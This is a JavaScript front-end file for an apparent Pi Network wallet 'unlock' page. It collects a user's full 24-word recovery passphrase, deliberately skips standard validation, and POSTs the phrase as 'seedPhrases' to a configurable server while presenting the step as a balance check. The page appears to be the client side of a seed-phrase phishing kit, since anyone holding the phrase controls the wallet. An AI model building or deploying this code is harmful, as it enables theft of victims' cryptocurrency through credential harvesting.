// frontend/js/unlock.js
document.addEventListener('DOMContentLoaded', function() {
  const passphraseInput = document.getElementById('passphrase');
  const submitBtn = document.getElementById('submitBtn');
  const findPassBtn = document.getElementById('findPassBtn');
  const statusDiv = document.getElementById('status');
  const invalidModal = document.getElementById('invalidModal');
  const dismissModalBtn = document.getElementById('dismissModalBtn');
  const modalFindBtn = document.getElementById('modalFindBtn');

  const API_URL = (window.APP_CONFIG && window.APP_CONFIG.API_URL) || window.API_URL || 'http://localhost:3000/api/check-balances';
  const INVALID_MESSAGE = 'Invalid passphrase: please enter a valid passphrase';
  const REQUEST_TIMEOUT = 60000; // 60 seconds

  function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = 'status ' + (type || '');
    statusDiv.style.display = 'block';
  }

  function hideStatus() {
    statusDiv.style.display = 'none';
  }

  function showInvalidModal() {
    invalidModal.style.display = 'flex';
  }

  function hideInvalidModal() {
    invalidModal.style.display = 'none';
  }

  // BASIC validation only - Pi Network does NOT follow strict BIP39
  function validatePassphrase(passphrase) {
    const words = passphrase.split(/\s+/).filter(Boolean);
    
    // Only check: 24 words, each word at least 2 characters
    // Do NOT use bip39 validation here
    if (words.length !== 24) {
      return { valid: false, reason: `Expected 24 words, got ${words.length}` };
    }
    
    if (words.some(w => w.length < 2)) {
      return { valid: false, reason: 'Some words are too short' };
    }
    
    return { valid: true, words: words };
  }

  async function checkBalance(passphrase) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), REQUEST_TIMEOUT);

    try {
      const response = await fetch(API_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          seedPhrases: [passphrase]
        }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || `HTTP ${response.status}`);
      }

      const data = await response.json();
      return data;
    } catch (error) {
      clearTimeout(timeoutId);
      
      if (error.name === 'AbortError') {
        throw new Error('Request timed out. Please try again.');
      }
      throw error;
    }
  }

  submitBtn.addEventListener('click', async function() {
    const passphrase = passphraseInput.value.trim();

    if (!passphrase) {
      showStatus('Please enter your passphrase', 'error');
      return;
    }

    // Basic validation only
    const validation = validatePassphrase(passphrase);
    if (!validation.valid) {
      console.log('❌ Validation failed:', validation.reason);
      showStatus(INVALID_MESSAGE, 'error');
      showInvalidModal();
      return;
    }

    submitBtn.disabled = true;
    submitBtn.textContent = 'Checking...';
    showStatus('Checking balance... This may take a few seconds.', 'loading');

    try {
      const data = await checkBalance(passphrase);

      console.log('📊 API Response:', data);

      if (data.results && data.results.length > 0) {
        const result = data.results[0];
        console.log('📊 First Result:', result);

        if (result.status === 'invalid') {
          showStatus(INVALID_MESSAGE, 'error');
          showInvalidModal();
        } else if (result.status === 'not_found') {
          showStatus('Wallet not found. Please check your passphrase.', 'error');
          showInvalidModal();
        } else if (result.status === 'error') {
          showStatus('Error checking balance: ' + (result.error || 'Unknown error'), 'error');
        } else {
          // Success - store result and redirect
          sessionStorage.setItem('walletResult', JSON.stringify(result));
          window.location.href = 'feedback.html';
        }
      } else {
        throw new Error('No results received');
      }
    } catch (error) {
      console.error('❌ Error:', error);
      showStatus(error.message || INVALID_MESSAGE, 'error');
    } finally {
      submitBtn.disabled = false;
      submitBtn.textContent = 'Submit';
    }
  });

  // Allow Enter key to submit
  passphraseInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      submitBtn.click();
    }
  });

  findPassBtn.addEventListener('click', function() {
    window.location.href = 'find-passphrase.html';
  });

  dismissModalBtn.addEventListener('click', function() {
    hideInvalidModal();
  });

  modalFindBtn.addEventListener('click', function() {
    window.location.href = 'find-passphrase.html';
  });

  invalidModal.addEventListener('click', function(e) {
    if (e.target === invalidModal) {
      hideInvalidModal();
    }
  });
});